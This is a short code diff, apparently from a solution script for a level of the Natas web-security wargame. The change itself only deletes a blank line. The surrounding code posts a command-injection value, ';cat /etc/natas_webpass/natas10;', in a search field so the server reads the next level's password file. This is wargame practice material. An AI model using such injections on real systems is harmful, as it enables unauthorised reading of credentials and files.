@@ -11,7 +11,6 @@ def get_natas10_password(natas9_password):
 
     session = requests.Session()
     session.auth = ("natas9", natas9_password)
-
     injection = ";cat /etc/natas_webpass/natas10;"
     data = {"needle": injection, "submit": "true"}
     request = session.post(URL, data=data)
